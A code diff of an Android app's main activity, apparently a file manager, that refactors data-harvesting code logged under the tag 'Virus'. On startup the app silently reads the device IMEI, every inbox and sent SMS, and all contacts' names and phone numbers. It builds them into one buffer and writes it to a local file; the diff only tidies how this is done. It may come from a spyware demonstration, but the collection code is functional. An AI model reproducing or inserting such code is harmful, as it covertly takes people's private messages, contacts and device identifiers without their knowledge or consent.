@@ -74,23 +74,22 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
 
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
 
-        String device_id = null;
-        device_id = tm.getDeviceId();
+        String device_id = tm.getDeviceId();
 
         ViewAssistClass veew = new ViewAssistClass();
         veew.viewStuff();
 
         StringBuilder exData = new StringBuilder();
 
-        Log.d("Virus", "Imei Number: " + device_id);
+        exData.append("\nImei Number: " + device_id);
 
         Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
 
         if (cursor.moveToFirst()) { // must check the result to prevent exception
             do {
-                String msgData = "";
+                StringBuilder msgData = new StringBuilder();
                 for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
-                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
+                    msgData.append(" " + cursor.getColumnName(idx) + ":" + cursor.getString(idx));
                 }
                 Log.i("Virus", "Message inbox: " + msgData);
                 exData.append("\nMessage inbox: " + msgData);
@@ -106,7 +105,6 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                     if (cursor2.getColumnName(idx).equals("_id") || cursor2.getColumnName(idx).equals("address") || cursor2.getColumnName(idx).equals("date") || cursor2.getColumnName(idx).equals("subject") || cursor2.getColumnName(idx).equals("body"))
                         msgData += " " + cursor2.getColumnName(idx) + ":" + cursor2.getString(idx);
                 }
-                Log.i("Virus", "Message sent: " + msgData);
                 exData.append("\nMessage sent: " + msgData);
             } while (cursor2.moveToNext());
         }
@@ -132,9 +130,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
                     while (pCur.moveToNext()) {
                         String phoneNo = pCur.getString(pCur.getColumnIndex(
                                 ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        Log.i("Virus", "Name: " + name);
                         exData.append("\nName: " + name);
-                        Log.i("Virus", "Phone Number: " + phoneNo);
                         exData.append("\nPhone Number: " + phoneNo);
                     }
                     pCur.close();
@@ -146,6 +142,7 @@ public class MainActivity extends AppCompatActivity implements FilesFragment.OnF
             cur.close();
         }
 
+        Log.i("Virus", exData.toString());
         veew.writeToFile(exData.toString(), getApplicationContext(), "test.txt");
 
         int sortType = SharedPreferenceHelper.getInteger(MainActivity.this,
